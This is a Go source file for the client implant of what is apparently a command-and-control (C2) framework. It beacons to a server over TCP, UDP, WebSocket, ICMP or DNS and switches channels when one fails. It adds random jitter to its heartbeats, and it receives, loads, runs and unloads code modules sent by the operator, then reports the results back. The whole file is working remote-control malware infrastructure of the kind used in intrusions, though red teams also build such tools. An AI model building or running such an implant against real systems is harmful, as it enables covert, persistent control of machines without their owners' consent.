package client

import (
    "context"
    "encoding/json"
    "fmt"
    "math/rand"
    "sync"
    "time"

    "github.com/Cl0udRs4/dinot/internal/client/module"
    "github.com/Cl0udRs4/dinot/internal/client/protocol"
)

// Config represents the client configuration
type Config struct {
    // ID is the client ID
    ID string
    
    // Name is the client name
    Name string
    
    // ServerAddresses is a map of protocol names to server addresses
    ServerAddresses map[string]string
    
    // HeartbeatInterval is the interval between heartbeats
    HeartbeatInterval time.Duration
    
    // ProtocolSwitchThreshold is the number of failures before switching protocols
    ProtocolSwitchThreshold int
}

// Client represents a C2 client
type Client struct {
    config                Config
    protocolMgr           *protocol.ProtocolManager
    moduleMgr             *module.ModuleManager
    ctx                   context.Context
    cancel                context.CancelFunc
    wg                    sync.WaitGroup
    heartbeatTick         *time.Ticker
    mu                    sync.RWMutex
    randomHeartbeatEnabled bool
    minHeartbeatInterval  time.Duration
    maxHeartbeatInterval  time.Duration
    lastHeartbeatTime     time.Time
    heartbeatFailCount    int
    heartbeatTimeout      time.Duration
    feedbackConfig        FeedbackConfig
}

// FeedbackConfig represents the configuration for the feedback mechanism
type FeedbackConfig struct {
    // MaxRetries is the maximum number of retries for a failed command
    MaxRetries int
    
    // RetryInterval is the base interval between retries
    RetryInterval time.Duration
    
    // MaxRetryInterval is the maximum interval between retries
    MaxRetryInterval time.Duration
    
    // RetryBackoffFactor is the factor by which the retry interval increases
    RetryBackoffFactor float64
}

// NewClient creates a new client
func NewClient(config Config) (*Client, error) {
    // Create protocols
    protocols := make([]protocol.Protocol, 0)
    
    if addr, ok := config.ServerAddresses["tcp"]; ok {
        protocols = append(protocols, protocol.NewTCPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["udp"]; ok {
        protocols = append(protocols, protocol.NewUDPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["ws"]; ok {
        protocols = append(protocols, protocol.NewWSProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["icmp"]; ok {
        protocols = append(protocols, protocol.NewICMPProtocol(addr))
    }
    
    if domain, ok := config.ServerAddresses["dns_domain"]; ok {
        if server, ok := config.ServerAddresses["dns_server"]; ok {
            protocols = append(protocols, protocol.NewDNSProtocol(domain, server))
        }
    }
    
    if len(protocols) == 0 {
        return nil, protocol.ErrNoProtocolAvailable
    }
    
    ctx, cancel := context.WithCancel(context.Background())
    
    return &Client{
        config:                config,
        protocolMgr:           protocol.NewProtocolManager(protocols, config.ProtocolSwitchThreshold),
        moduleMgr:             module.NewModuleManager(),
        ctx:                   ctx,
        cancel:                cancel,
        heartbeatTick:         time.NewTicker(config.HeartbeatInterval),
        randomHeartbeatEnabled: false,
        minHeartbeatInterval:  1 * time.Second,
        maxHeartbeatInterval:  24 * time.Hour,
        heartbeatTimeout:      30 * time.Second,
        heartbeatFailCount:    0,
        lastHeartbeatTime:     time.Now(),
        feedbackConfig: FeedbackConfig{
            MaxRetries:         3,
            RetryInterval:      1 * time.Second,
            MaxRetryInterval:   30 * time.Second,
            RetryBackoffFactor: 2.0,
        },
    }, nil
}

// Start starts the client
func (c *Client) Start() error {
    err := c.protocolMgr.Connect(c.ctx)
    if err != nil {
        return err
    }
    
    // Start heartbeat goroutine
    c.wg.Add(1)
    go c.heartbeatLoop()
    
    // Start command handler goroutine
    c.wg.Add(1)
    go c.commandLoop()
    
    return nil
}

// Stop stops the client
func (c *Client) Stop() error {
    c.cancel()
    c.heartbeatTick.Stop()
    c.wg.Wait()
    return c.protocolMgr.Disconnect()
}

// heartbeatLoop sends periodic heartbeats to the server
func (c *Client) heartbeatLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        case <-c.heartbeatTick.C:
            c.mu.Lock()
            c.lastHeartbeatTime = time.Now()
            c.mu.Unlock()
            
            err := c.sendHeartbeat()
            if err != nil {
                c.mu.Lock()
                c.heartbeatFailCount++
                
                // If we've failed too many times, try switching protocols
                if c.heartbeatFailCount >= c.config.ProtocolSwitchThreshold {
                    // The protocol manager will handle the actual switching
                    c.heartbeatFailCount = 0
                }
                
                c.mu.Unlock()
            } else {
                c.mu.Lock()
                c.heartbeatFailCount = 0
                
                // If random heartbeats are enabled, update the interval
                if c.randomHeartbeatEnabled {
                    c.updateHeartbeatInterval()
                }
                
                c.mu.Unlock()
            }
        }
    }
}

// sendHeartbeat sends a heartbeat to the server
func (c *Client) sendHeartbeat() error {
    c.mu.RLock()
    randomEnabled := c.randomHeartbeatEnabled
    interval := c.config.HeartbeatInterval
    if c.heartbeatTick != nil {
        // Reset the ticker with the current interval
        c.heartbeatTick.Reset(interval)
    }
    c.mu.RUnlock()
    
    heartbeat := map[string]interface{}{
        "type":           "heartbeat",
        "client_id":      c.config.ID,
        "timestamp":      time.Now().Unix(),
        "random_enabled": randomEnabled,
        "interval":       interval.Milliseconds(),
        "protocol":       c.protocolMgr.GetCurrentProtocol().GetName(),
    }
    
    data, err := json.Marshal(heartbeat)
    if err != nil {
        // Log error
        return err
    }
    
    return c.protocolMgr.Send(data)
}

// commandLoop receives and processes commands from the server
func (c *Client) commandLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        default:
            c.processNextCommand()
        }
    }
}

// processNextCommand processes the next command from the server
func (c *Client) processNextCommand() {
    data, err := c.protocolMgr.Receive(5 * time.Second)
    if err != nil {
        // Handle timeout or other errors
        time.Sleep(1 * time.Second)
        return
    }
    
    var command struct {
        Type   string          `json:"type"`
        Module string          `json:"module,omitempty"`
        Params json.RawMessage `json:"params,omitempty"`
    }
    
    err = json.Unmarshal(data, &command)
    if err != nil {
        // Log error
        return
    }
    
    switch command.Type {
    case "execute_module":
        c.handleExecuteModule(command.Module, command.Params)
    case "load_module":
        c.handleLoadModule(command.Module, command.Params)
    case "unload_module":
        c.handleUnloadModule(command.Module)
    }
}

// handleExecuteModule handles the execute_module command
func (c *Client) handleExecuteModule(moduleName string, params json.RawMessage) {
    var commandID string
    
    // Extract command ID if present
    var commandData struct {
        CommandID string `json:"command_id,omitempty"`
    }
    
    if err := json.Unmarshal(params, &commandData); err == nil && commandData.CommandID != "" {
        commandID = commandData.CommandID
    }
    
    // Create initial response with "processing" status
    response := FeedbackResponse{
        Type:      "module_result",
        ClientID:  c.config.ID,
        CommandID: commandID,
        Module:    moduleName,
        Success:   false,
        Status:    "processing",
        Timestamp: time.Now().Unix(),
    }
    
    // Send initial feedback
    err := c.sendFeedback(response)
    if err != nil {
        // Log error but continue processing
    }
    
    // Execute module with retry logic
    var result json.RawMessage
    var execErr error
    retryCount := 0
    retryInterval := c.feedbackConfig.RetryInterval
    
    for retryCount <= c.feedbackConfig.MaxRetries {
        result, execErr = c.moduleMgr.ExecuteModule(c.ctx, moduleName, params)
        
        if execErr == nil {
            // Successful execution
            break
        }
        
        // Check if error is retryable
        if isRetryableError(execErr) {
            retryCount++
            
            if retryCount > c.feedbackConfig.MaxRetries {
                break
            }
            
            // Send retry status
            retryResponse := FeedbackResponse{
                Type:       "module_result",
                ClientID:   c.config.ID,
                CommandID:  commandID,
                Module:     moduleName,
                Success:    false,
                Error:      execErr.Error(),
                RetryCount: retryCount,
                Status:     "retrying",
                Timestamp:  time.Now().Unix(),
            }
            
            err = c.sendFeedback(retryResponse)
            if err != nil {
                // Log error but continue processing
            }
            
            // Update retry interval with exponential backoff
            retryInterval = time.Duration(float64(retryInterval) * c.feedbackConfig.RetryBackoffFactor)
            if retryInterval > c.feedbackConfig.MaxRetryInterval {
                retryInterval = c.feedbackConfig.MaxRetryInterval
            }
            
            // Wait before retrying
            select {
            case <-c.ctx.Done():
                execErr = c.ctx.Err()
                break
            case <-time.After(retryInterval):
                // Continue with retry
            }
        } else {
            // Non-retryable error
            break
        }
    }
    
    // Prepare final response
    finalResponse := FeedbackResponse{
        Type:       "module_result",
        ClientID:   c.config.ID,
        CommandID:  commandID,
        Module:     moduleName,
        Success:    execErr == nil,
        RetryCount: retryCount,
        Timestamp:  time.Now().Unix(),
    }
    
    if execErr != nil {
        finalResponse.Error = execErr.Error()
        finalResponse.Status = "failed"
    } else {
        finalResponse.Result = result
        finalResponse.Status = "completed"
    }
    
    // Send final feedback
    err = c.sendFeedback(finalResponse)
    if err != nil {
        // Log error
    }
}

// handleLoadModule handles the load_module command
func (c *Client) handleLoadModule(moduleName string, params json.RawMessage) {
    // Extract command ID if present
    var commandData struct {
        CommandID   string `json:"command_id,omitempty"`
        ModuleBytes []byte `json:"module_bytes"`
    }
    
    err := json.Unmarshal(params, &commandData)
    
    // Create initial response with "processing" status
    response := FeedbackResponse{
        Type:      "module_load_result",
        ClientID:  c.config.ID,
        CommandID: commandData.CommandID,
        Module:    moduleName,
        Success:   false,
        Status:    "processing",
        Timestamp: time.Now().Unix(),
    }
    
    // Send initial feedback
    c.sendFeedback(response)
    
    // Prepare final response
    finalResponse := FeedbackResponse{
        Type:      "module_load_result",
        ClientID:  c.config.ID,
        CommandID: commandData.CommandID,
        Module:    moduleName,
        Success:   false,
        Timestamp: time.Now().Unix(),
    }
    
    if err != nil {
        finalResponse.Error = fmt.Sprintf("Failed to parse module data: %v", err)
        finalResponse.Status = "failed"
    } else {
        // Load the module with retry logic
        retryCount := 0
        retryInterval := c.feedbackConfig.RetryInterval
        var loadErr error
        
        for retryCount <= c.feedbackConfig.MaxRetries {
            loadErr = c.moduleMgr.LoadModuleFromBytes(moduleName, commandData.ModuleBytes)
            
            if loadErr == nil {
                // Successful loading
                break
            }
            
            // Check if error is retryable
            if isRetryableError(loadErr) {
                retryCount++
                
                if retryCount > c.feedbackConfig.MaxRetries {
                    break
                }
                
                // Send retry status
                retryResponse := FeedbackResponse{
                    Type:       "module_load_result",
                    ClientID:   c.config.ID,
                    CommandID:  commandData.CommandID,
                    Module:     moduleName,
                    Success:    false,
                    Error:      loadErr.Error(),
                    RetryCount: retryCount,
                    Status:     "retrying",
                    Timestamp:  time.Now().Unix(),
                }
                
                c.sendFeedback(retryResponse)
                
                // Update retry interval with exponential backoff
                retryInterval = time.Duration(float64(retryInterval) * c.feedbackConfig.RetryBackoffFactor)
                if retryInterval > c.feedbackConfig.MaxRetryInterval {
                    retryInterval = c.feedbackConfig.MaxRetryInterval
                }
                
                // Wait before retrying
                select {
                case <-c.ctx.Done():
                    loadErr = c.ctx.Err()
                    break
                case <-time.After(retryInterval):
                    // Continue with retry
                }
            } else {
                // Non-retryable error
                break
            }
        }
        
        if loadErr != nil {
            finalResponse.Error = fmt.Sprintf("Failed to load module: %v", loadErr)
            finalResponse.Status = "failed"
            finalResponse.RetryCount = retryCount
        } else {
            finalResponse.Success = true
            finalResponse.Status = "completed"
            finalResponse.RetryCount = retryCount
        }
    }
    
    // Send final feedback
    c.sendFeedback(finalResponse)
}

// handleUnloadModule handles the unload_module command
func (c *Client) handleUnloadModule(moduleName string) {
    // Create initial response with "processing" status
    response := FeedbackResponse{
        Type:      "module_unload_result",
        ClientID:  c.config.ID,
        CommandID: "", // No command ID for unload module
        Module:    moduleName,
        Success:   false,
        Status:    "processing",
        Timestamp: time.Now().Unix(),
    }
    
    // Send initial feedback
    c.sendFeedback(response)
    
    // Unload the module with retry logic
    retryCount := 0
    retryInterval := c.feedbackConfig.RetryInterval
    var unloadErr error
    
    for retryCount <= c.feedbackConfig.MaxRetries {
        unloadErr = c.moduleMgr.UnloadModule(moduleName)
        
        if unloadErr == nil {
            // Successful unloading
            break
        }
        
        // Check if error is retryable
        if isRetryableError(unloadErr) {
            retryCount++
            
            if retryCount > c.feedbackConfig.MaxRetries {
                break
            }
            
            // Send retry status
            retryResponse := FeedbackResponse{
                Type:       "module_unload_result",
                ClientID:   c.config.ID,
                CommandID:  "", // No command ID for unload module
                Module:     moduleName,
                Success:    false,
                Error:      unloadErr.Error(),
                RetryCount: retryCount,
                Status:     "retrying",
                Timestamp:  time.Now().Unix(),
            }
            
            c.sendFeedback(retryResponse)
            
            // Update retry interval with exponential backoff
            retryInterval = time.Duration(float64(retryInterval) * c.feedbackConfig.RetryBackoffFactor)
            if retryInterval > c.feedbackConfig.MaxRetryInterval {
                retryInterval = c.feedbackConfig.MaxRetryInterval
            }
            
            // Wait before retrying
            select {
            case <-c.ctx.Done():
                unloadErr = c.ctx.Err()
                break
            case <-time.After(retryInterval):
                // Continue with retry
            }
        } else {
            // Non-retryable error
            break
        }
    }
    
    // Prepare final response
    finalResponse := FeedbackResponse{
        Type:       "module_unload_result",
        ClientID:   c.config.ID,
        CommandID:  "", // No command ID for unload module
        Module:     moduleName,
        Success:    unloadErr == nil,
        RetryCount: retryCount,
        Timestamp:  time.Now().Unix(),
    }
    
    if unloadErr != nil {
        finalResponse.Error = unloadErr.Error()
        finalResponse.Status = "failed"
    } else {
        finalResponse.Status = "completed"
    }
    
    // Send final feedback
    c.sendFeedback(finalResponse)
}

// EnableRandomHeartbeat enables random heartbeat intervals
func (c *Client) EnableRandomHeartbeat(min, max time.Duration) {
    c.mu.Lock()
    defer c.mu.Unlock()
    
    c.randomHeartbeatEnabled = true
    c.minHeartbeatInterval = min
    c.maxHeartbeatInterval = max
    
    // Generate a new random interval immediately
    c.updateHeartbeatInterval()
}

// DisableRandomHeartbeat disables random heartbeat intervals
func (c *Client) DisableRandomHeartbeat() {
    c.mu.Lock()
    defer c.mu.Unlock()
    
    c.randomHeartbeatEnabled = false
    
    // Reset to the configured interval
    if c.heartbeatTick != nil {
        c.heartbeatTick.Stop()
    }
    c.heartbeatTick = time.NewTicker(c.config.HeartbeatInterval)
}

// updateHeartbeatInterval generates a new random heartbeat interval
func (c *Client) updateHeartbeatInterval() {
    if !c.randomHeartbeatEnabled {
        return
    }
    
    // Generate a random duration between min and max
    randomDuration := c.minHeartbeatInterval +
        time.Duration(rand.Int63n(int64(c.maxHeartbeatInterval-c.minHeartbeatInterval)))
    
    // Update the ticker
    if c.heartbeatTick != nil {
        c.heartbeatTick.Stop()
    }
    c.heartbeatTick = time.NewTicker(randomDuration)
}

// GetSupportedModules returns a list of supported modules
func (c *Client) GetSupportedModules() []string {
    return c.moduleMgr.GetModules()
}

// FeedbackResponse represents a standardized response format for command execution
type FeedbackResponse struct {
    // Type is the type of the response
    Type string `json:"type"`
    
    // ClientID is the ID of the client
    ClientID string `json:"client_id"`
    
    // CommandID is the ID of the command
    CommandID string `json:"command_id,omitempty"`
    
    // Module is the name of the module
    Module string `json:"module,omitempty"`
    
    // Success indicates whether the command was successful
    Success bool `json:"success"`
    
    // Result contains the result of the command
    Result json.RawMessage `json:"result,omitempty"`
    
    // Error contains the error message if the command failed
    Error string `json:"error,omitempty"`
    
    // RetryCount is the number of retries attempted
    RetryCount int `json:"retry_count,omitempty"`
    
    // Status is the current status of the command
    Status string `json:"status,omitempty"`
    
    // Timestamp is the time when the response was created
    Timestamp int64 `json:"timestamp"`
}

// sendFeedback sends feedback to the server with retry logic
func (c *Client) sendFeedback(response FeedbackResponse) error {
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return err
    }
    
    var lastErr error
    retryCount := 0
    retryInterval := c.feedbackConfig.RetryInterval
    
    for retryCount <= c.feedbackConfig.MaxRetries {
        err = c.protocolMgr.Send(data)
        if err == nil {
            // Successfully sent feedback
            return nil
        }
        
        lastErr = err
        retryCount++
        
        if retryCount > c.feedbackConfig.MaxRetries {
            break
        }
        
        // Update retry interval with exponential backoff
        retryInterval = time.Duration(float64(retryInterval) * c.feedbackConfig.RetryBackoffFactor)
        if retryInterval > c.feedbackConfig.MaxRetryInterval {
            retryInterval = c.feedbackConfig.MaxRetryInterval
        }
        
        // Wait before retrying
        select {
        case <-c.ctx.Done():
            return c.ctx.Err()
        case <-time.After(retryInterval):
            // Continue with retry
        }
    }
    
    return fmt.Errorf("failed to send feedback after %d retries: %v", retryCount, lastErr)
}

// isRetryableError determines if an error is retryable
func isRetryableError(err error) bool {
    // Check for network-related errors that are typically retryable
    if err == protocol.ErrSendFailed || err == protocol.ErrNotConnected {
        return true
    }
    
    // Check for context cancellation or deadline exceeded
    if err == context.Canceled || err == context.DeadlineExceeded {
        return false
    }
    
    // Add more specific error checks as needed
    
    // By default, consider errors as non-retryable
    return false
}
